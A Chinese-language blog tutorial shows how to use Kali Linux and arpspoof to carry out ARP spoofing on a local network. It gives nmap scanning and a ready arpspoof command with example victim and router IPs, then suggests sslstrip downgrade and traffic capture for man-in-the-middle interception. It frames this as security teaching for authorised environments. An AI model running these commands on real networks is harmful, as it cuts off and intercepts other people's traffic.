---
title: 'Kali Linux 進行局域網 ARP Spoofing'
date: '2024/1/18'
lastmod: '2024/1/18'
tags: [ kali , 網路]
draft: false
summary: '本篇僅為**資訊安全相關課程或學術研究用途**，示範操在合法授權的環境中，對局域網進行斷網攻擊，嚴禁應用於未經授權的網路環境，以免觸犯法律。'
images: ['https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS_Ks-mHt4ZuYAi53cxnwhStGy0wZQpz_XNuA&s']
authors: ['default']
layout: PostLayout
---

# Kali Linux 進行局域網 ARP Spoofing 

本篇僅為**資訊安全相關課程或學術研究用途**，示範操在合法授權的環境中，對局域網進行斷網攻擊，嚴禁應用於未經授權的網路環境，以免觸犯法律。

## 🧠 一、什麼是 ARP Spoofing？

ARP（Address Resolution Protocol）是路由器對 IP 位址進行廣播來找到 MAC 位址的協定。  
ARP spoofing 是一種攻擊方式，藉由向局域網中的設備發送假的 ARP 對應資料，讓路由器誤以為攻擊人的 MAC 位址是受害者的 MAC 位址，進而達成「中間人攻擊（MITM）」。

### 以下為 ARP Spoofing 架構圖：
![ARP Spoofing](https://ppt.cc/fP1ksx@.png)




## ⚙️ 二、使用 `arpspoof` 前的準備工作

#### 啟動kali前這裡一定要先做：
(1) 設定虛擬機網卡(以VMware為例)
![設定網路](https://ppt.cc/fSgKkx@.png)

### 1. 開啟 Kali Linux  
確認 Kali 裝置與目標設備在同一個局域網中（子網也要相同）。  
例如：  
✔️攻擊者IP為**192.168.0.15**，受害者IP為**192.168.0.16**  
❌攻擊者IP為**192.168.1.15**，受害者IP為**192.168.0.16**  

### 2. 安裝 `dsniff` 套件  
`arpspoof` 是 `dsniff` 套件的一部分：

```bash
sudo apt update
sudo apt install dsniff
```

## 🔍 三、查找網段資訊與目標設備
1. 查看本機 IP 與閘道： 
```
ip a
```

2. 使用 nmap 掃描網段： 可以找出所有網段的設備IP
```
nmap 192.168.0.0-255
```

## 🧪 四、使用 arpspoof 執行攻擊

- **以下為指令解釋**：
```
sudo arpspoof -i <哪一張網卡> -t <受害者ip> -r <路由器ip>
```

- **操作舉例：**  
攻擊者ip：**192.168.0.100**  
受害者ip：**192.168.0.12**  
路由器ip：**192.168.0.1**  
網卡名稱：**eth0**
```
sudo arpspoof -i eth0 -t 192.168.0.12 -r 192.168.0.1
```

## 🛠 五、即可發現成功使受害者設備無法上網

#### 接下來成功建立中間人後可以：

- 使用 Wireshark 擷取 HTTP 封包

- 搭配 sslstrip 對 HTTPS 進行降級攻擊（進階）

- 搭配 Burp Suite 做流量分析與重送請求


####  ⚠️ 再次溫馨提醒：本篇僅供學術用途，請勿侵害他人，若違反本篇一概不負相關法律責任！！